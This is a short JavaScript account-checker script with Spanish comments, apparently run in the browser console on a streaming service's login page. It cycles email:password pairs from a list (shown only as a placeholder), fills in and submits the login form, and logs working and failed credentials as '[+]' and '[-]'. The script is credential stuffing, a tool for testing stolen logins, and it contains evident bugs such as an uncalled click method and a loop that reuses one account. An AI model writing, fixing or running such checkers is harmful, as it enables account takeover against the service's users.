const accounts = [
    'Correo:Contraseña'
]

const random = Math.floor(Math.random() * accounts.length)

const user = accounts[random].split(":")[0] // Separamos el correo del la contraseña
const password = accounts[random].split(":")[1] // Separamos la contraseña del correo

// Detectar si se encuentra el error de sesion
if (!document.querySelector("#root > div > div.sc-kLwhqv.bcxbrK > div > div > div.Wrapper-sc-62m9tu-0.dupjdh.encore-negative-set.sc-ksdxgE.gmnGJa")) {
    document.querySelector("#login-button").click()
    
}

// Detecta si la cuenta no funciona 
if (document.querySelector("#root > div > div.sc-kLwhqv.bcxbrK > div > div > div.Wrapper-sc-62m9tu-0.dupjdh.encore-negative-set.sc-ksdxgE.gmnGJa")) {

    for (var i = 0; i < accounts.length; i++) {

        // Usuario
        setTimeout(function () {
            document.querySelector("#login-username").value = "" + user + ""
        }, 1500);

        // Contraseña
        setTimeout(function () {
            document.querySelector("#login-password").value = "" + password + ""
        }, 1800);

        setTimeout(function () {
            // Boton de login
            document.querySelector("#login-button").click
                
            // Log Cuenta mala
            console.log("[-] User: " + user + " Password: " + password)
        }, 4000);
    }

    // la cuenta funciona 
} else {

    setTimeout(function () {
        // Log Cuenta Encontrada 
        console.log("[+] User: " + user + " Password: " + password)
    }, 5000);
}

